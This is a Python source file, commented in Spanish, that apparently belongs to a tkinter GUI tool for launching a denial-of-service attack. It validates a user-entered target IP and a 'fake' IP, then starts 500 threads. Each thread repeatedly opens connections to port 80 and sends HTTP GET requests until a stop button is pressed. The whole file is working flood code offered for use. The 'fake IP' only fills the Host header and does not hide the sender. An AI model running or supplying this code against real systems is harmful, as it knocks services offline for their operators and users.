import threading
import socket
import tkinter as tk
from tkinter import messagebox

# Variable de control para detener el ataque
evento_stop = threading.Event()

def validar_ip(ip):
    try:
        socket.inet_aton(ip)  # Verifica que la IP tenga el formato correcto
        return True
    except socket.error:
        return False

def ejecutar_ataque_dos(ataque_dos_entry, target_ip_entry, fake_ip_entry):
    global evento_stop
    evento_stop.clear()  # Asegura que el evento esté limpio al iniciar el ataque

    #ip del objetivo
    #target = '192.168.1.218'
    target = target_ip_entry.get().strip()
    #fake_ip = '182.21.20.32'
    fake_ip = fake_ip_entry.get().strip()
    port = 80

    try:
        socket.gethostbyname(target)  # Intenta resolver la IP del objetivo
    except socket.gaierror:
        messagebox.showerror("Error", "La IP del objetivo no es válida o no se encuentra.")
        return

    if not validar_ip(fake_ip):
        messagebox.showerror("Error", "La IP falsa ingresada no es válida.")
        return

    def ataque_dos():
        #Función para enviar solicitudes HTTP continuamente
        def attack():
            while not evento_stop.is_set():  # Verifica si se debe detener el ataque
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target, port))
                    s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
                    s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
                    s.close()
                except:
                    break #detiene el ataque

        for _ in range(500): # _ se coloca cuando no se va a utilizar la variable del for
            thread = threading.Thread(target=attack)
            thread.start()

    ataque_dos_entry.delete("1.0", tk.END)  # Limpiar el área de resultados
    ataque_dos_entry.insert(tk.END, "El ataque DoS ha sido iniciado.\n")
    hilo = threading.Thread(target=ataque_dos)
    hilo.daemon = True  # Asegura que el hilo termine al cerrar la aplicación
    hilo.start()


def parar_ataque_dos(ataque_dos_entry):
    global evento_stop
    evento_stop.set()  # Activa el evento para detener los hilos
    ataque_dos_entry.delete("1.0", tk.END)
    ataque_dos_entry.insert(tk.END, "El ataque ha sido frenado.")